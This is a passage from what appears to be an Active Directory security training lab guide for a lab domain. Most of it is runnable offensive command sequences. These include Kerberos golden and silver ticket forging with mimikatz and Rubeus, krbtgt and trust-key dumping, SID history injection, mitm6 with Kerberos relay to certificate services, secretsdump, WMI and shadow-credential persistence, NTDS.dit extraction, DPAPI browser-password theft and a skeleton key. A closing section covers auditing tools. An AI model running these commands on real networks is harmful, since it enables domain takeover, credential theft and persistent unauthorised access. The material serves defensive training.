E:\GOC213\GhostPack\Rubeus.exe asktgt /user:bfu /password:"Pa$$w0rd" /domain:contoso.com /enctype:AES256 /proxyurl:https://contoso-srv/kdcproxy /outfile:E:\GOC213\Loot\tgt-bfu.kirbi
```

```batchfile
E:\GOC213\GhostPack\Rubeus.exe asktgs /ticket:E:\GOC213\Loot\tgt-bfu.kirbi /service:MSSQLSvc/pc3.contoso.com /enctype:RC4 /proxyurl:https://contoso-srv/kdcproxy
```

### Kerberos Silver Ticket Attack

#### Computer Account Credentials

| Computer | User | Password |
|-|-|-|
| CONTOSO-SRV | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::ekeys"
```

```powershell
Import-Module \\local\GOC213\DSInternals
ConvertTo-KerberosKey -Salt 'CONTOSO.COMhostcontoso-srv.contoso.com' -Iterations 4096
```

```powershell
(Get-ADReplAccount -Server contoso-dc -SamAccountName 'CONTOSO-SRV$').SupplementalCredentials.KerberosNew.Credentials
```

#### Ticket Generation

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
klist purge

\\local\GOC213\GhostPack\Rubeus.exe silver /aes256:ce9a5080b977df32dd52d986bcfedc9b465f62b89d5cc82b983bd41aa3c15fa4 /user:Admin /service:cifs/contoso-srv.contoso.com /printcmd /ptt /ldap /nowrap

dir \\contoso-srv.contoso.com\c$
```

### Kerberos Golden Ticket Attack

#### Retrieve KRBTGT Secret

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```powershell
(Get-ADGroup -Identity 'Domain Admins').SID
(Get-ADDomain).DomainSid.Value
```

```powershell
Import-Module \\local\GOC213\DSInternals
$krbtgt = Get-ADReplAccount -Server contoso-dc -SamAccountName krbtgt
$krbtgt.SupplementalCredentials.KerberosNew.Credentials
ConvertTo-Hex $krbtgt.NTHash
```

#### A. Mimikatz

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
klist purge
\\local\GOC213\mimikatz\x64\mimikatz.exe
```

```batchfile
kerberos::golden /ptt /user:Admin /domain:contoso.com /aes256:20fb0621396b3cd32efa2d0edf39487658bc0619cc609c0029a23aa795afd14e /sid:S-1-5-21-2474978765-2619710211-1762062286 /service:krbtgt /startoffset:0 /endin:600 /renewmax:10080 /id:1000 /groups:512,518,519,520
```

#### B. Rubeus

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
klist purge
\\local\GOC213\GhostPack\Rubeus.exe golden /user:admin /aes256:20fb0621396b3cd32efa2d0edf39487658bc0619cc609c0029a23aa795afd14e /newpac /printcmd /ptt /ldap /nowrap
```

#### Post-Exploitation

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
klist
dir \\contoso-dc.contoso.com\c$
klist get cifs/contoso-dc.contoso.com
```

```powershell
Enter-PSSession 'contoso-dc.contoso.com'
Add-ADGroupMember -Identity 'Domain Admins' -Members bfu
Exit-PSSession
```

<https://github.com/microsoft/New-KrbtgtKeys.ps1>

### Cross-Forest Golden Ticket Attack

#### Trust Properties

| Computer | User | Password |
|-|-|-|
| ADATUM-DC | ADATUM\Admin | Pa$$w0rd |

```batchfile
netdom trust /d:contoso.com adatum.com /EnableSidHistory
netdom trust /d:contoso.com adatum.com /EnableSidHistory:yes

netdom trust /d:contoso.com adatum.com /EnablePIMTrust
netdom trust /d:contoso.com adatum.com /EnablePIMTrust:yes
```

#### Impersonating DnsAdmins

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```powershell
Get-ADGroup -Identity DnsAdmins -Server adatum.com
```

```powershell
Import-Module \\local\GOC213\DSInternals
$krbtgt = Get-ADReplAccount -Server contoso-dc -SamAccountName krbtgt
$krbtgt.SupplementalCredentials.KerberosNew.Credentials
```

```batchfile
klist purge
\\local\GOC213\mimikatz\x64\mimikatz.exe
```

```batchfile
kerberos::golden /ptt /user:Admin /domain:contoso.com
/aes256:20fb0621396b3cd32efa2d0edf39487658bc0619cc609c0029a23aa795afd14e
/service:krbtgt /startoffset:0 /endin:600 /renewmax:10080
/sid:S-1-5-21-2474978765-2619710211-1762062286 /id:1000 /groups:512,518,519,520
/sids:S-1-5-21-938793711-3613651074-186196483-1102
```

```batchfile
klist purge
\\local\GOC213\GhostPack\Rubeus.exe golden /aes256:20fb0621396b3cd32efa2d0edf39487658bc0619cc609c0029a23aa795afd14e /user:Admin /sids:S-1-5-21-938793711-3613651074-186196483-1102 /newpac /ldap /ptt /printcmd /nowrap
```

### Cross-Forest Pass-the-Key

#### Dump Trust Credentials on DC

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\mimikatz\x64\mimikatz.exe "privilege::debug" "lsadump::trust /patch"
```

#### Pass-the-Key

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\GhostPack\Rubeus.exe asktgt /user:CONTOSO$ /domain:adatum.com /rc4:e1874310c18a0dc8d5777b145a609b58 /outfile:adatum.kirbi /ptt
ldp.exe
```

### Cross-Forest SID History Injection

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```powershell
Import-Module \\local\GOC213\DSInternals

Get-ADGroup -Identity DnsAdmins -Server adatum.com

Stop-Service -Name NTDS -Force

Add-ADDBSidHistory -SamAccountName Admin `
                   -SidHistory S-1-5-21-1236425271-2880748467-2592687428-1102 `
                   -DatabasePath 'C:\Windows\NTDS\ntds.dit' `
                   -Force

Start-Service -Name NTDS

klist purge
```

### MITM6 + Kerberos Relay

#### Kerberos Relay to&nbsp;CA Web Enrollment

| Computer |
|-|
| Kali Linux |

```bash
sudo ~/env-impacket/bin/python3 krbrelayx/krbrelayx.py --victim contoso-pc2.contoso.com --adcs --target http://contoso-dc.contoso.com/certsrv/ --template Machine
```

#### MITM6

| Computer |
|-|
| Kali Linux |

```bash
sudo ~/env-pytools/bin/mitm6 --host-allowlist contoso-pc2.contoso.com --relay contoso-dc.contoso.com --domain contoso.com --no-ra
```

Now reboot CONTOSO-PC2.

#### Kerberos PKINIT

| Computer |
|-|
| Kali Linux |

```bash
~/env-pytools/bin/python3 PKINITtools/gettgtpkinit.py 'CONTOSO/CONTOSO-PC2$' pc2.ccache -pfx-base64 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
```

#### Kerberos S4U

| Computer |
|-|
| Kali Linux |

```bash
~/env-pytools/bin/python3 PKINITtools/gets4uticket.py -v kerberos+ccache://contoso.com\\contoso-pc2\$:pc2.ccache@contoso-dc.contoso.com HOST/contoso-pc2.contoso.com@CONTOSO.COM Admin@contoso.com admin.ccache
```

#### Pass-the-Ticket

| Computer |
|-|
| Kali Linux |

```bash
KRB5CCNAME=admin.ccache ~/env-impacket/bin/wmiexec.py -k -no-pass contoso.com/Admin@contoso-pc2.contoso.com 'dir c:'
```

```bash
KRB5CCNAME=admin.ccache ~/env-impacket/bin/secretsdump.py -k -no-pass contoso.com/Admin@contoso-pc2.contoso.com
```

### Misconfigured Certificate Templates

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
\\local\GOC213\GhostPack\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /password:admin /ptt /getcredentials /enctype:aes256
powershell.exe Invoke-Command -ComputerName contoso-dc.contoso.com -ScriptBlock { systeminfo }
```

```batchfile
\\local\GOC213\GhostPack\Certify.exe find /vulnerable
```

## 8. Persistence

### AdminSDHolder

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```powershell
# Modify AdminSDHolder permissions
$adminSDHolder = 'CN=AdminSDHolder,CN=System,{0}' -f (Get-ADDomain).DistinguishedName
dsacls.exe $adminSDHolder /G 'Enterprise Key Admins:RPWP;msDS-KeyCredentialLink'

# Force ACL propagation
$pdc = (Get-ADDomain).PDCEmulator
$rootDSE = [adsi] "LDAP://$pdc/RootDSE"
$rootDSE.UsePropertyCache = $false
$rootDSE.Put('runProtectAdminGroupsTask', 1)
$rootDSE.SetInfo()
```

### WMI Persistence

#### Create

| Computer |
|-|
| Local |

```powershell
$payload = {
    Get-Date >> C:\test.txt
}

$encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))

$command = "powershell.exe -EncodedCommand $encodedPayload"

$timer = Set-WmiInstance -Class __IntervalTimerInstruction -Arguments @{
    IntervalBetweenEvents = ([UInt32] 10000)
    SkipIfPassed = $False
    TimerId = 'PayloadTrigger'
}

$filter = Set-WmiInstance -Class __EventFilter -Namespace root/subscription -Arguments @{
    EventNamespace = 'root/cimv2'
    Name = 'TimerTrigger'
    Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'PayloadTrigger'"
    QueryLanguage = 'WQL'
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription -Arguments @{
    Name = 'ExecuteEvilPowerShell'
    CommandLineTemplate = $command
}

$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subscription -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

#### Check

| Computer |
|-|
| Local |

```batchfile
E:\GOC213\WmiExplorer.exe
```

```batchfile
E:\GOC213\SysinternalsSuite\Autoruns64.exe
```

#### Remove

| Computer |
|-|
| Local |

```powershell
$consumer = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'ExecuteEvilPowerShell'"
$filter = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'TimerTrigger'"
$binding = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($consumer.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
$timer = Get-WmiObject -Namespace root/cimv2 -Class __IntervalTimerInstruction -Filter "TimerId = 'PayloadTrigger'"

Remove-WmiObject -InputObject $binding
Remove-WmiObject -InputObject $consumer
Remove-WmiObject -InputObject $filter
Remove-WmiObject -InputObject $timer
```

### NTAuth Store

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```batchfile
certutil -enterprise -store NTAuth
```

### Shadow Credentials

#### DSInternals

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```powershell
# Victim
$targetAccount = Get-ADUser -Identity Admin

# Generate a new RSA key pair
$certificateSubject = '{0}/{1}/login.windows.net/383a3889-5bc9-47a3-846c-2b70f0b7fe0e/{2}' -f $targetAccount.SID,(New-Guid),$targetAccount.UserPrincipalName
$certificate = New-SelfSignedCertificate -Subject $certificateSubject `
                                         -KeyLength 2048 `
                                         -Provider 'Microsoft Strong Cryptographic Provider' `
                                         -CertStoreLocation Cert:\CurrentUser\My `
                                         -NotAfter (Get-Date).AddYears(30) `
                                         -TextExtension '2.5.29.19={text}false', '2.5.29.37={text}1.3.6.1.4.1.311.20.2.2' `
                                         -SuppressOid '2.5.29.14' `
                                         -KeyUsage None `
                                         -KeyExportPolicy Exportable
```

```batchfile
certmgr.msc
```

```powershell
# Write the public key into Active Directory
Import-Module \\local\GOC213\DSInternals
$ngcKey = Get-KeyCredential -Certificate $certificate -DeviceId (New-Guid) -HolderDN $targetAccount.DistinguishedName

Set-ADObject -Identity $targetAccount -Add @{ 'msDS-KeyCredentialLink' = $ngcKey.ToDNWithBinary() }
```

```powershell
# Report
Get-ADObject -LDAPFilter '(msDS-KeyCredentialLink=*)' -Properties msDS-KeyCredentialLink |
    Select-Object -ExpandProperty msDS-KeyCredentialLink |
    Get-KeyCredential
```

```powershell
# ROCA
Get-ADObject -LDAPFilter '(msDS-KeyCredentialLink=*)' -Properties msDS-KeyCredentialLink |
    Select-Object -ExpandProperty msDS-KeyCredentialLink |
    Get-KeyCredential |
    Format-Table -View ROCA
```

```powershell
# Remove a specific key from AD
Get-ADObject -LDAPFilter '(msDS-KeyCredentialLink=*)' -Properties msDS-KeyCredentialLink |
    Select-Object -ExpandProperty msDS-KeyCredentialLink |
    Get-KeyCredential |
    Out-GridView -OutputMode Multiple -Title 'Select a credentials for removal...' |
    ForEach-Object { Set-ADObject -Identity $PSItem.Owner -Remove @{ 'msDS-KeyCredentialLink' = $PSItem.ToDNWithBinary() } }
```

```powershell
# Remove all keys from AD
Set-ADObject -Identity $targetAccount -Clear 'msDS-KeyCredentialLink'
```

#### Whisker

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\whisker list /target:Admin
\\local\GOC213\whisker add /target:Admin
\\local\GOC213\whisker clear /target:Admin
```

### AD Database Offline Access

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```batchfile
ntdsutil.exe "ac in ntds" ifm "create full C:\ADBackup" quit quit
robocopy.exe C:\ADBackup \\local\Loot\ADBackup /S /NDL /NJH /NJS
```

| Computer |
|-|
| Local |

```powershell
Import-Module E:\GOC213\DSInternals

Get-BootKey -SystemHiveFilePath 'E:\GOC213\Loot\ADBackup\registry\SYSTEM'

Get-ADDBAccount -All -DatabasePath 'E:\GOC213\Loot\ADBackup\Active Directory\ntds.dit' -BootKey e42907934a51b33a7f5938c436fa02c4 |
    Test-PasswordQuality
```

### DPAPI

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

Save a&nbsp;password in&nbsp;Microsoft Edge.

| Computer |
|-|
| Local |

```powershell
Import-Module E:\GOC213\DSInternals

Get-BootKey -SystemHiveFilePath 'E:\GOC213\Loot\ADBackup\registry\SYSTEM'

Get-ADDBBackupKey -DatabasePath 'E:\GOC213\Loot\ADBackup\Active Directory\ntds.dit' -BootKey 13ed17124b2ba46ea3d787f31e6f8195 | Save-DPAPIBlob -DirectoryPath E:\GOC213\Loot
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

Assumption: BFU is&nbsp;already a&nbsp;Domain Admin.

```bat
"\\local\goc213\GhostPack\SharpChrome.exe" logins /browser:edge /server:contoso-pc1 /pvk:"\\local\loot\ntds_capi_eca6c000-9f9f-46d6-982c-3723ca241e6f.pvk"
```

### DCShadow

TODO

### Skeleton Key

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\mimikatz\x64\mimikatz.exe "privilege::debug" "misc::skeleton"
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```powershell
Enter-PSSession -ComputerName CONTOSO-SRV -Credential CONTOSO\Administrator # Password is mimikatz
```

## 9. AD Security Auditing

### Active Directory Explorer

[Documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer)

### PingCastle

[Documentation](https://www.pingcastle.com/documentation/)

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\PingCastle_3.1.0.1\pingcastle.exe --healthcheck --server contoso.com --user CONTOSO\bfu --password "Pa$$w0rd" --protocol LDAPOnly --quota 10 --level Full --no-enum-limit --explore-trust --explore-forest-trust
```

```batchfile
\\local\GOC213\PingCastle_3.1.0.1\pingcastle.exe --carto
```

```batchfile
\\local\GOC213\PingCastle_3.1.0.1\pingcastle.exe --scanner spooler --server contoso.com --scmode-dc
type ad_scanner_spooler_contoso.com.txt
```

### Purple Knight

[Documentation](https://www.purple-knight.com/)

| Computer    | User          | Password |
|-------------|---------------|----------|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
Copy-Item -Path '\\local\GOC213\PK Community 4.0' -Destination 'C:\PurpleKnight' -Recurse -Force -Container
C:\PurpleKnight\PurpleKnight.exe
```

### Forest Druid

[Documentation](https://www.purple-knight.com/forest-druid/)

| Computer    | User          | Password |
|-------------|---------------|----------|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
Copy-Item -Path '\\local\GOC213\ForestDruid-Community' -Destination 'C:\ForestDruid' -Recurse -Force -Container
Set-Location -Path C:\ForestDruid
.\ForestDruid.exe
```

### AD ACL Scanner

[Repository](https://github.com/canix1/ADACLScanner)

| Computer    | User          | Password |
|-------------|---------------|----------|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
\\local\GOC213\ADACLScan.ps1
```

### Weak Password Finder

[Product site](https://delinea.com/resources/weak-password-finder-tool-active-directory)

| Computer    | User          | Password |
|-------------|---------------|----------|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\WeakPasswordFinder\DelineaWeakPasswordFinder.exe
```

### BloodHound

[Repository](https://github.com/SpecterOps/BloodHound)

#### Collect AD information

| Computer    | User          | Password |
|-------------|---------------|----------|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\SharpHound-v1.1.1\SharpHound.exe --collectionmethods All --domain contoso.com
bloodhound-python -d contoso.com -u bfu -p 'Pa$$w0rd' -c All,LoggedOn --zip
```

#### Analyze the&nbsp;data

| Computer |
|-|
| Kali Linux |

```bash
neo4j start
chromium --no-sandbox http://localhost:7474 &
```

Default neo4j credentials:

| User  | Password |
|-------|----------|
| neo4j | neo4j    |

```bash
bloodhound &
```

Tasks:

* Upload ZIP
* Find shortest paths to&nbsp;Domain Admins

### GPOZaurr

[Reposiory](https://github.com/EvotecIT/GPOZaurr)

### AD Hidden Object Detector

[Blog](https://www.semperis.com/blog/find-hidden-active-directory-objects/)

| Computer    | User          | Password |
|-------------|---------------|----------|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\dsdetect\VC_redist.x64.exe /install /passive
\\local\GOC213\dsdetect\dsdetect.exe --server contoso-dc --partition "DC=contoso,DC=com" --overwrite
```

### Security Baselines

TODO
